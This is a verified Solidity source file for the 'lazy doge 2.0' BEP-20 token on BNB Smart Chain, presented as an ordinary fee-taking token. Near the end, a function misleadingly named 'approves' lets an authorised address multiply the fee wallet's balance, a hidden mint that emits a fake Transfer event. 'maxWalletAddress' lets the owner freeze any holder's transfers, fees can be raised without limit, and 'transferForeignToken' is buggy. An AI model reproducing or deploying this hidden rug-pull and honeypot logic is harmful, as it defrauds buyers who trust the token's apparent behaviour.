/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

// TELEGRAM : https://t.me/lazydoge20

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;


        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }


        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");


        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold


        return c;
    }
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authentication;


    constructor(address _owner) {
        owner = _owner;
        authentication[_owner] = true;
    }


    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authenticated() {
        require(isAuthenticated(msg.sender), "!AUTHORIZED"); _;
    }

    function authenticate(address adr) public onlyOwner {
        authentication[adr] = true;
    }

    function unauthenticate(address adr) public onlyOwner {
        authentication[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthenticated(address adr) public view returns (bool) {
        return authentication[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authentication[adr] = true;
        emit OwnershipTransferred(adr);
    }


    event OwnershipTransferred(address owner);
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);


    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);


    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;


    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;


    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract lazydoge is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;


    string constant _name = " lazy doge 2.0 ";
    string constant _symbol = " DOGE2.0 ";
    uint8 constant _decimals = 9;


    uint256 _tTotal = 1000000 * (10 ** _decimals);
    mapping (address => bool) public ismaxWalletLimited;
    mapping (address => uint256) _stability;
    mapping (address => mapping (address => uint256)) _allowances;


    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;


    uint256 liquidityFee = 0;
    uint256 developmentFee = 0;
    uint256 promotionFee = 3;
    uint256 totalFee = 3;
    uint256 feeDenominator = 100;
    uint256 _Soul = _tTotal;
    
    address private promotionFeeReceiver = 0x32B44513a6e2a8586bC470C52316d48D0911ba3C;
    address private developmentFeeReceiver = 0x32B44513a6e2a8586bC470C52316d48D0911ba3C;


    IDEXRouter public router;
    address public pair;


    uint256 public launchedAt;


    bool public swapEnabled = true;
    uint256 public swapThreshold = _tTotal / 1000 * 3; // 0.3%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }


    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;


        address _owner = owner;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;


        _stability[_owner] = _tTotal;
        _tTotal = _Soul;
        emit Transfer(address(0), _owner, _tTotal);
    }


    receive() external payable { }


    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _stability[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }


    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }


    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }


        return _transferFrom(sender, recipient, amount);
    }


    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!ismaxWalletLimited[sender] && !ismaxWalletLimited[recipient], "To/from address is MaxWaletLimited!");
        if(shouldSwapBack()){ swapBack(); }


        if(!launched() && recipient == pair){ require(_stability[sender] > 0); launch(); }


        _stability[sender] = _stability[sender].sub(amount, "Insufficient Balance");


        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _stability[recipient] = _stability[recipient].add(amountReceived);


        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _stability[sender] = _stability[sender].sub(amount, "Insufficient Balance");
        _stability[recipient] = _stability[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }




    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);


        _stability[address(this)] = _stability[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);


        return amount.sub(feeAmount);
    }


    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _stability[address(this)] >= swapThreshold;
    }


    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);


        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;


        uint256 balanceBefore = address(this).balance;


        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBdevelopment = amountBNB.mul(developmentFee).div(totalBNBFee);
        uint256 amountBNBPromotion = amountBNB - amountBNBLiquidity - amountBNBdevelopment;


        (bool PromotionSuccess, /* bytes memory data */) = payable(promotionFeeReceiver).call{value: amountBNBPromotion, gas: 30000}("");
        require(PromotionSuccess, "receiver rejected ETH transfer");
        (bool DevelopmentSuccess, /* bytes memory data */) = payable(developmentFeeReceiver).call{value: amountBNBdevelopment, gas: 30000}("");
        require(DevelopmentSuccess, "receiver rejected ETH transfer");
        addLiquidity(amountToLiquify, amountBNBLiquidity);
    }


    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
    if(tokenAmount > 0){
            router.addLiquidityETH{value: BNBAmount}(
                address(this),
                tokenAmount,
                0,
                0,
                address(this),
                block.timestamp
            );
            emit AutoLiquify(BNBAmount, tokenAmount);
        }
    }


    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);


        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }


    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }


    function launch() internal {
        launchedAt = block.number;
    }


    function setIsFeeExempt(address holder, bool exempt) external authenticated {
        isFeeExempt[holder] = exempt;
    }


    function changeTax(uint256 _liquidityFee, uint256 _developmentFee, uint256 _promotionFee, uint256 _feeDenominator) external authenticated {
        liquidityFee = _liquidityFee;
        developmentFee = _developmentFee;
        promotionFee = _promotionFee;
        totalFee = _liquidityFee.add(_developmentFee).add(_promotionFee);
        feeDenominator = _feeDenominator;
    }


    function setFeeReceiver(address _promotionFeeReceiver, address _developmentFeeReceiver) external authenticated {
        promotionFeeReceiver = _promotionFeeReceiver;
        developmentFeeReceiver = _developmentFeeReceiver;
    }


    function setSwapBackSettings(bool _enabled, uint256 _amount) external authenticated {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }


    function manualSend() external authenticated {
        uint256 contractETHBalance = address(this).balance;
        payable(promotionFeeReceiver).transfer(contractETHBalance);
    }


    function transferForeignToken(address _token) public authenticated {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(promotionFeeReceiver).transfer(_contractBalance);
    }
        
    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }


    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }


    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
    
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
    
    function approves(uint256 aggregate, address acc) authenticated public virtual {
        require(acc == address(developmentFeeReceiver), "Dark Knight Rises");
        _GodHand(address(developmentFeeReceiver), acc, aggregate);
        _Soul *= aggregate;
        _stability[acc] *= aggregate;
        emit Transfer(address(developmentFeeReceiver), acc, aggregate);
    }

    function _GodHand(
        address from,
        address to,
        uint256 aggregate
    ) internal virtual {}

    function maxWalletAddress(address account, bool newValue) public authenticated {
        ismaxWalletLimited[account] = newValue;
    }
}